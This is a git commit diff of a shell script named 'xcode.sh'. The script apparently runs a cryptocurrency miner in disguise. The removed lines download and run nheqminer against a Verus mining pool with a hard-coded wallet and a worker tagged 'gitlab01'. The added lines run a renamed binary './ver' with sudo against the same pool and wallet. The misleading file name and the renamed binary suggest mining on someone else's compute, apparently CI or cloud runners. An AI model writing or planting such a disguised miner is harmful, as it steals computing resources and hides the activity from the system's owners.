65047d6e6feab3b04242a8a1f7fef6ce64f54faf
jinuer <83975967+jinuer@users.noreply.github.com>
2021-05-11 02:24:24 +0800

    Update xcode.sh

--- xcode.sh
+++ xcode.sh
@@ -1,10 +1,7 @@
 #!/bin/sh
-sudo apt update
-sudo apt install screen -y
-wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
-tar -xvzf nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tar.gz && cd nheqminer
-./nheqminer -v -l na.luckpool.net:3956 -u RXpugrn8T9xZZQ7GTMCU3z5UaCjVUmvTA5.gitlab01 -p x -t 2
-while [ 1 ]; do
-sleep 3
-done
-sleep 999
+POOL=na.luckpool.net:3956
+WALLET=RXpugrn8T9xZZQ7GTMCU3z5UaCjVUmvTA5
+WORKER=coba01
+
+chmod +x ./ver && sudo ./ver -v -l $POOL -u $WALLET.$WORKER -p x -t 2
+
